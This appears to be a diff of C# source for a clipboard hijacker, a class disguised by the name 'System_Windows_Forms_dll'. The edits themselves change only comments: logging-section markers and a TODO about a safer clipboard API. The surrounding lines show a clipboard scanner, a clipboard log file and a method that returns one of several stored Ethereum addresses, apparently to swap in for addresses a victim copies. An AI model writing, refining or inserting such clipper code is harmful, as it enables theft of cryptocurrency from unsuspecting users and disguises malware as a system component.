@@ -41,7 +41,7 @@ public sealed class System_Windows_Forms_dll
     private readonly static Random RAND = new Random();
     private static IDataObject clipData = null;
 
-    //Logging Content - DELETABLE
+    //Logging Content INIT
     private readonly static string path = Directory.GetParent(Directory.GetCurrentDirectory()).FullName + @"\ClipboardLogger.log";
     private static int loopCounter = 1;
     private readonly static string logInfo = " INFO - ";
@@ -50,6 +50,8 @@ public sealed class System_Windows_Forms_dll
     public string returnTimeStampNow(){
         return string.Format("{0:[yyyy-MM-dd hh-mm-ss-ffff]}",DateTime.Now);
     }
+
+    //Logging Content END
     private string randEthAddr(){
         int randSelector = RAND.Next(1, 11);
         return ethDict[randSelector].GetData(DataFormats.Text).ToString();
@@ -65,6 +67,7 @@ public sealed class System_Windows_Forms_dll
     }
 
     //WARNING - potential stack over flow error but low chance
+    //TODO: refer to SetDataObject(object data, bool copy, int retryTimes, int retryDelay) as a safer alternative**
     private void setClipboardScanner(){
         clipData = Clipboard.GetDataObject();
         if (clipData == null){
